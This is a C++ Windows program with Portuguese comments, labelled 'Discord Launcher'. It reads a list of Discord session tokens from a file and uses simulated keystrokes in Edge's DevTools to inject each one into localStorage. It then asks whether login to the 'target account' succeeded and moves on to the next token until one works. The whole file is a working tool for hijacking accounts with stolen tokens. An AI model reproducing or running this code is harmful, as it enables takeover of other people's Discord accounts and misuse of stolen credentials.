#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include <fstream>
#include <sstream>

// Lê TODOS os tokens do discord.txt na mesma pasta do exe
std::vector<std::wstring> LerTodosTokens() {
    wchar_t exe_path[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
    std::wstring path(exe_path);
    size_t sep = path.rfind(L'\\');
    if (sep != std::wstring::npos) path = path.substr(0, sep + 1);
    path += L"discord.txt";

    std::wifstream f(path);
    if (!f.is_open()) return {};
    std::wstringstream ss; ss << f.rdbuf();
    std::wstring content = ss.str();

    std::vector<std::wstring> tokens;
    std::wregex re(LR"(\[\d+\]\s+([\w\.\-]+))");
    auto it  = std::wsregex_iterator(content.begin(), content.end(), re);
    auto end = std::wsregex_iterator();
    for (; it != end; ++it) tokens.push_back((*it)[1].str());
    return tokens;
}

// Mata o Edge
void FecharEdge() {
    SHELLEXECUTEINFOA si = { sizeof(si) };
    si.fMask = SEE_MASK_NOCLOSEPROCESS;
    si.lpVerb = "open"; si.lpFile = "taskkill";
    si.lpParameters = "/F /IM msedge.exe /T"; si.nShow = SW_HIDE;
    if (ShellExecuteExA(&si) && si.hProcess) {
        WaitForSingleObject(si.hProcess, 4000);
        CloseHandle(si.hProcess);
    }
    Sleep(1500);
}

// Simula tecla virtual (F12, Enter, etc.)
void EnviarTeclaVirtual(WORD vKey) {
    INPUT inputs[2] = {};
    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = vKey;
    inputs[1].type = INPUT_KEYBOARD;
    inputs[1].ki.wVk = vKey;
    inputs[1].ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(2, inputs, sizeof(INPUT));
}

// Digita texto Unicode caractere a caractere
void DigitarTexto(const std::wstring& texto) {
    for (wchar_t c : texto) {
        INPUT inputs[2] = {};
        inputs[0].type = INPUT_KEYBOARD;
        inputs[0].ki.wScan = c;
        inputs[0].ki.dwFlags = KEYEVENTF_UNICODE;
        inputs[1].type = INPUT_KEYBOARD;
        inputs[1].ki.wScan = c;
        inputs[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        SendInput(2, inputs, sizeof(INPUT));
        Sleep(10);
    }
}

// Injeta token no Edge e retorna true se conseguiu abrir
bool InjetarToken(const std::wstring& token) {
    LPCSTR app = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    char cmd[] = "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" https://discord.com/channels/@me";

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(app, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "Erro ao abrir Edge: " << GetLastError() << std::endl;
        return false;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "  -> Aguardando carregamento (5s)..." << std::endl;
    Sleep(5000);

    std::cout << "  -> Abrindo DevTools (F12)..." << std::endl;
    EnviarTeclaVirtual(VK_F12);
    Sleep(3000);

    std::cout << "  -> Digitando JS..." << std::endl;
    std::wstring js =
        L"setInterval(()=>{document.body.appendChild(document.createElement('iframe'))"
        L".contentWindow.localStorage.token='\"" + token + L"\"'},50);"
        L"setTimeout(()=>{location.reload();},2500);";
    DigitarTexto(js);
    EnviarTeclaVirtual(VK_RETURN);

    std::cout << "  -> Injetado! Aguardando reload (4s)..." << std::endl;
    Sleep(4000);
    return true;
}

int main() {
    SetConsoleOutputCP(CP_UTF8);

    std::cout << "========================================" << std::endl;
    std::cout << "  Discord Launcher" << std::endl;
    std::cout << "========================================" << std::endl << std::endl;

    auto tokens = LerTodosTokens();
    if (tokens.empty()) {
        std::cerr << "ERRO: nenhum token em discord.txt" << std::endl;
        std::cin.get(); return 1;
    }
    std::cout << "[*] " << tokens.size() << " token(s) encontrado(s)" << std::endl;
    std::cout << "    NAO mexa no teclado/mouse durante a injecao (~10s)" << std::endl;
    std::cout << "========================================" << std::endl << std::endl;

    bool sucesso = false;
    for (size_t i = 0; i < tokens.size(); ++i) {
        std::wcout << L"[" << (i+1) << L"/" << tokens.size()
                   << L"] Token: " << tokens[i].substr(0, 22) << L"..." << std::endl;

        InjetarToken(tokens[i]);

        // Traz o console para frente para o usuario responder
        HWND console = GetConsoleWindow();
        if (console) {
            SetForegroundWindow(console);
            BringWindowToTop(console);
        }

        std::cout << "[?] Fez login na conta alvo? (s/n): ";
        char resp = 0;
        std::cin >> resp;

        if (resp == 's' || resp == 'S') {
            std::cout << "[OK] Token [" << (i+1) << "] funcionou!" << std::endl;
            sucesso = true;
            break;
        }

        std::cout << "[!] Token [" << (i+1) << "] nao funcionou. ";
        if (i + 1 < tokens.size()) {
            std::cout << "Fechando Edge e tentando proximo..." << std::endl << std::endl;
            FecharEdge();
        } else {
            std::cout << "Todos os tokens foram testados." << std::endl;
        }
    }

    if (!sucesso)
        std::cout << std::endl << "[!] Nenhum token funcionou." << std::endl;

    std::cout << std::endl << "Pressione Enter para sair..." << std::endl;
    std::cin.ignore(); std::cin.get();
    return 0;
}
